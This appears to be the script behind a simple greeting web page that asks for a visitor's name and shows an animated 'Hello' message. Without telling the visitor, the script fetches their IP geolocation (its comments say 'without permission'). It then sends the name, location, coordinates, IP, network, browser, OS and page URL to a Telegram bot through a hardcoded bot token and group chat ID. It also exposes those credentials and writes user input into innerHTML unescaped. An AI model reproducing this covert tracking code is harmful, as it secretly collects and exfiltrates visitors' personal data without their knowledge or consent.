// token: REVOKES!

// https://api.telegram.org/bot1634752031:AAFUBFnE_ha10K7hkIfwxaMIBtAsjUcbDWw/getUpdates

// https://api.telegram.org/bot1634752031:AAFUBFnE_ha10K7hkIfwxaMIBtAsjUcbDWw/sendMessage?chat_id=1045583544&text=123
// -1001424076191  - для группы

const btn = document.querySelector(".btn");
const input = document.querySelector(".input");
const hiName = document.querySelector("#hiName");
const modal = document.querySelector(".modal");
const wrapper = document.querySelector(".wrapper");
const token = "1634752031:AAFUBFnE_ha10K7hkIfwxaMIBtAsjUcbDWw";
const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=-1001424076191&text=";


// получение данных о геолокации (ширины и доготы) через встроенные методы, 
// но с разрешение
// navigator.geolocation.getCurrentPosition(pos => {
//     console.log("Longitude: " + pos.coords.longitude); // Выведем долготу
//     console.log("Latitude: " + pos.coords.latitude);   // Выведем широту
// }, error => console.log("Пожалуйста, разрешите доступ к использованию Вашей геопозиции!"));

let country, regionName, city, lat, lon, query, as;
// получает данные о местоположении пользователя, 
// но без разрешения
$.getJSON("//ip-api.com/json/?lang=ru", function(data) {  
    
    country = data.country;
    regionName = data.regionName;
    city = data.city;
    lat = data.lat;
    lon = data.lon;
    query = data.query;
    seti = data.as;   

});

btn.addEventListener("click", function(){

    let name = input.value;

    let result = `Имя пользователя: ${name};                                                                                 
    Страна: ${country};                                                                                 
    Регион: ${regionName};                                                                                                     
    Город: ${city};                                                                                                     
    Координаты: широта - ${lat}, долгота - ${lon};                                                             
    Ip: ${query};                                                                                 
    Сеть: ${seti};                                                             
    Браузер: ${navigator.userAgent};                                                                                                                    
    ОС устройства: ${navigator.platform};                                                                                 
    Адрес сайта: ${location.toString()};`;

    if( name == "" ){

        alert("Введи имя");
        
    }else{
        this.setAttribute("disabled", "disabled");

        let strHi = `Привет, ${name}!`;

        wrapper.classList.add("animate__animated");
        modal.classList.add("animate__animated");

        wrapper.classList.add("animate__fadeOutUp");
        wrapper.style.setProperty('--animate-duration', '1.8s');

        modal.classList.add("animate__fadeInUp");
        modal.style.setProperty('--animate-duration', '1.5s');

        modal.style.display = "flex";

        setTimeout(()=>{
            modal.classList.add("animate__fadeOutUp");
            modal.style.setProperty('--animate-duration', '1.8s');

            wrapper.classList.add("animate__fadeInUp");
            wrapper.style.setProperty('--animate-duration', '1.5s');

            wrapper.classList.remove("animate__fadeOutUp");

            setTimeout(()=>{
                modal.classList.remove("animate__fadeInUp");
                modal.classList.remove("animate__fadeOutUp");
                wrapper.classList.remove("animate__fadeInUp");

                wrapper.style.setProperty('--animate-duration', 'none');
                modal.style.setProperty('--animate-duration', 'none');

                modal.style.display = "";

                wrapper.classList.remove("animate__animated");
                modal.classList.remove("animate__animated");

                this.removeAttribute("disabled");

            }, 1900);

        }, 2000);

        hiName.innerHTML = strHi;

        let xhttp = new XMLHttpRequest();
        xhttp.open("GET", url + `${result}`, true );
        xhttp.send();

    }
});


